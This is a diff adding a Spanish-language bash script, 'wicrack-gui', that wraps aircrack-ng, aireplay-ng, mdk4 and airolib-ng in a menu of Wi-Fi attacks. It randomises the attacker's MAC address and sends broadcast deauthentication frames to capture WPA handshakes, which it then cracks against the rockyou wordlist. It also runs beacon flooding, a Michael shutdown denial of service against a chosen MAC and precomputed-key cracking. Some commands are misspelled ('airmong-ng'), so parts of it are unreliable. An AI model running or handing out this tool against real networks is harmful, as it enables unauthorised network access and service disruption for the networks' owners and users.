@@ -1,0 +1,260 @@
+#!/bin/bash
+
+#
+#
+#	wicrack-gui
+#	Desarrollado para otra sección
+#	1. General.
+#	2. Definir Funciones.
+#	3. Generar flujo para instrucciones [radiobuttons]
+#	4. Fin
+#
+#
+
+#--------ELEGIR EL TIPO DE ATAQUE A TRAVÉS DE UN RADIOBUTTON.
+
+whiptail --title "[*]wicrack-gui --- shadowvmx[*]" --radiolist \
+"ATAQUES POSIBLES" 10 78 4 \
+1. "[*]Deauth-attack." ON \
+2. "[*]Beacon Flood-Attack" OFF \
+3. "[*]Michael Shutdown Exploitation-Attack" OFF \
+4. "[*]PMKS-Death Generate-Attack." OFF 2> answer
+
+thing=$(cat answer)
+
+if [[ $thing = "" ]] ; then
+rm -f answer 2> /dev/null
+exit
+fi
+
+
+#----------SECCIÓN GENERAL, SE LLEVA A CABO UNA VEZ SE ELIGE EL TIPO DE ATAQUE.
+
+
+	whiptail --title "[+]WICRACK --- SHADOWVMX[+]"  --msgbox "Vamos a empezar con todo el proceso de ataque." 8 78
+	whiptail --title "wicrack <--> shadowvmx" --msgbox "[+]LISTANDO INTERFACES -- SELECCIONA LA INALÁMBRICA[+]" 8 78
+
+	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+        counter=1; for interface in $(cat iface); do
+                let counter++
+        done
+
+        checker=0; while [ $checker -ne 1 ]; do
+		ifaces=$(whiptail --inputbox "Interfaces disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "NETWORK INTERFACES" 3>&1 1>&2 2>&3)
+                for interface in $(cat iface); do
+                        if [ "$ifaces" == "$interface" ]; then
+                                checker=1
+                        fi
+                done; if [ $checker -eq 0 ]; then whiptail --title "[*]ERROR[*]" --msgbox "[+]INEXISTENTE[+]" 8 78; fi
+        done
+
+	ifconfig $ifaces down &> /dev/null
+	sleep 1
+	macchanger -r $ifaces &> /dev/null
+	sleep 1
+	ifconfig $ifaces up &> /dev/null
+
+	pkill dhclient &> /dev/null
+	pkill wpa_supplicant &> /dev/null
+
+	sleep 1
+
+	tput civis; whiptail --title "wicrack <--> shadowvmx" --msgbox "[+]CONFIGURANDO $ifaces EN MODO MONITOR[+]" 8 78
+	tput civis; airmon-ng start $ifaces > /dev/null 2>&1; newifaces="${ifaces}mon"
+
+	rm iface 2>/dev/null
+
+	whiptail --title "[+]MODIFICANDO MAC --- ALEATORIA.[+]" --msgbox "RANDOMIZE" 8 78
+
+#------------------------------------------------------------------------------
+
+{
+for ((i=0;i<100;i++)); do
+       sleep 0.01
+       echo $i
+done
+} | whiptail --gauge "PROCESANDO ... " 6 50 0
+
+#------------------------------------------------------------------------------
+whiptail --title "wicrack --- shadowvmx" --msgbox "[+]COMPLETADO CON ÉXITO[+]" 8 78
+
+#-----------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+#DEFINICIÓN DE FUNCIONES
+
+
+function decryptk(){
+	trap deauth EXIT
+	whiptail --title "[+]DE-AUTENTICATE ATTACK[+]" --msgbox "Vamos a abrir una terminal, presione ctrl_c para parar el sniffing." 8 78
+	airodump-ng $newifaces
+}
+
+
+
+
+
+
+function deauth(){
+	if [[ $? == 1 ]] ; then
+	whiptail --title "[+]ERROR, INTERFAZ NO POSIBLE.[+]" --msgbox "Quizás ha elegido la interfaz incorrecta." 8 78
+	else
+	rm -f captura* &> /dev/null
+	canal=$(whiptail --inputbox "Canal que desea utilizar." 8 39  --title "[+]DA-ATTACK[+]" 3>&1 1>&2 2>&3)
+	airmong-ng stop $newifaces &> /dev/null
+	sleep 1
+	airmong-ng start $ifaces $canal &> /dev/null
+	essid=$(whiptail --inputbox "ESSID que desea crackear." 8 39 --title "[+]set essid[+]" 3>&1 1>&2 2>&3)
+	whiptail --title "[*]EJECUTANDO, NO TOQUE NADA[*]" --msgbox "[+]ATTACKING-NETWORK[+]" 8 78
+	#xterm -e zsh -c "timeout 5 airodump-ng -c $canal -w captura --essid $essid $newifaces"
+	timeout 5 airodump-ng -c $canal --essid $essid $newifaces &> /dev/null &
+	xterm -e zsh -c "timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newifaces" 
+	#timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newifaces &> /dev/null &
+	#xterm -e zsh -c "timeout 30 airodump-ng -c $canal -w captura --essid $essid $newifaces"
+	timeout 40 airodump-ng -c $canal -w captura --essid $essid $newifaces &> /dev/null &
+	{
+	for ((i=0;i<100;i++)); do
+       sleep 0.5
+       echo $i
+	done
+	} | whiptail --gauge "CAPTURANDO HANDSHAKES ... " 6 50 0
+
+	gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
+	whiptail --title "[+]FUERZA BRUTA.[+]" --msgbox "[+]No cancele...[+]" 8 78
+	sleep 1
+	aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
+	airmon-ng stop $newifaces &> /dev/null
+	rm -f answer
+	fi
+}
+
+
+
+
+function bflood(){
+	trap end EXIT
+	whiptail --title "[+]BEACON FLOOD ATTACK[+]" --msgbox "[+]INICIANDO[+]" 8 78
+	whiptail --title "[+]DEPRECATED --- DÉJALO AL MENOS 1 MINUTO --- PARA CON CTRL_C" --msgbox "[*]DEPRECATED[*]" 8 78
+	xterm -e zsh -c "mdk4 $newifaces b -s 100"
+}
+
+
+
+
+function end(){
+	airmon-ng stop $newifaces &> /dev/null
+}
+
+
+
+function premichael(){
+	trap michael EXIT
+	whiptail --title "[+]MICHAEL SHUTDOWN-ATTACK[+]" --msgbox "[*]COPIAR LA MAC OBJETIVO[*] --- [*]PARA CON CTRL_C[*]" 8 78
+	airodump-ng $newifaces
+}
+
+
+
+
+
+function michael(){
+	if [[ $? == 1 ]] ; then
+        whiptail --title "[+]ERROR, INTERFAZ NO POSIBLE.[+]" --msgbox "Quizás ha elegido la interfaz incorrecta." 8 78
+        else
+	CAM=$(whiptail --inputbox "[*]INGRESE LA MAC[*]" 8 39  --title "[+]TRYING TO SHUT IT DOWN.[+]" 3>&1 1>&2 2>&3)
+	xterm -e zsh -c "mdk4 $newifaces m -t $CAM"
+	airmon-ng stop $newifaces &> /dev/null
+	rm -f answer 2> /dev/null
+	fi
+}
+
+
+
+
+function precomputado(){
+	trap ends EXIT
+	whiptail --title "[+]PRECOM-SELECTED[+]" --msgbox "[*]SIGA LAS INSTRUCCIONES SINO IRÁ MÁS LENTO EL ATAQUE.[*]" 8 78
+	ls -l passwords-airolib &> /dev/null
+	if [[ $? = 0 ]] ; then
+	whiptail --title "[+]RECIBIENDO DATOS[+]" --msgbox "[*]LIBRERÍA DETECTADA[*]" 8 78
+	else
+	airolib-ng passwords-airolib --import passwd /usr/share/wordlists/rockyou.txt
+	fi
+
+	ls -l essid.lst &> /dev/null
+
+	if [[ $? = 0 ]] ; then
+        whiptail --title "[+]SEGUIMOS RECIBIENDO DATOS[+]" --msgbox "[*]LIBRERÍA DETECTADA[*]" 8 78
+        else
+	echo "$essid" > essid.lst
+	airolib-ng passwords-airolib --import essid essid.lst
+	fi
+
+	whiptail --title "[+]GENERANDO HASHES[+]" --msgbox "[*]Estamos precomputando, puede tardar bastante según diccionario, puede pararlo cuando quiera con el peso de perder potencia más adelante.[*]" 8 78
+	xterm -e zsh -c "airolib-ng passwords-airolib --batch"
+	whiptail --title "[+]CIERRE CUANDO ESTÉ PREPARADO[+]" --msgbox "[*]ESTAMOS LISTOS PARA CARGAR.[*]" 8 78
+	ends
+}
+
+
+
+
+function killcomputo(){
+	whiptail --title "[+]CIERRE CUANDO SEPA CANAL Y ESSID[+]" --msgbox "[*]EXPLOTACIÓN CLAVES PRECOMPUTADAS[*]" 8 78
+	xterm -e zsh -c "airodump-ng $newifaces"
+	if [[ $? == 1 ]] ; then
+        whiptail --title "[+]ERROR, INTERFAZ NO POSIBLE.[+]" --msgbox "Quizás ha elegido la interfaz incorrecta." 8 78
+        else
+	canal=$(whiptail --inputbox "Canal que desea utilizar." 8 39  --title "[+]DA-ATTACK[+]" 3>&1 1>&2 2>&3)
+        airmong-ng stop $newifaces &> /dev/null
+        sleep 1
+        airmong-ng start $ifaces $canal &> /dev/null
+        essid=$(whiptail --inputbox "ESSID que desea crackear." 8 39 --title "[+]set essid[+]" 3>&1 1>&2 2>&3)
+        whiptail --title "[*]EJECUTANDO, NO TOQUE NADA[*]" --msgbox "[+]ATTACKING-NETWORK[+]" 8 78
+        #xterm -e zsh -c "timeout 5 airodump-ng -c $canal -w captura --essid $essid $newifaces"
+        timeout 5 airodump-ng -c $canal --essid $essid $newifaces &> /dev/null &
+        xterm -e zsh -c "timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newifaces" 
+        #timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newifaces &> /dev/null &
+        #xterm -e zsh -c "timeout 30 airodump-ng -c $canal -w captura --essid $essid $newifaces"
+        timeout 30 airodump-ng -c $canal -w captura --essid $essid $newifaces &> /dev/null &
+	gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null	
+	{
+for ((i=0;i<100;i++)); do
+       sleep 0.2
+       echo $i
+done
+} | whiptail --gauge "PROCESANDO ... " 6 50 0
+
+
+	precomputado
+        fi
+}
+
+
+function ends(){
+	aircrack-ng -w passwords-airolib captura-01.cap
+        airmong-ng stop $newifaces
+	rm -f answer 2> /dev/null
+
+}
+
+
+
+#LLAMADA A LAS FUNCIONES CON LA CONDICIÓN DEL RADIOBUTTON INICIAL
+
+thing=$(cat answer)
+
+if [[ $thing = "1." ]] ; then
+decryptk
+elif [[ $thing = "2." ]] ; then
+bflood
+elif [[ $thing = "3." ]] ; then
+premichael
+elif [[ $thing = "4." ]] ; then
+killcomputo
+else
+whiptail --title "[*]NO HA SELECCIONADO NINGÚN ATAQUE[*]" --msgbox "[+]EXITING[+]" 8 78
+fi
+
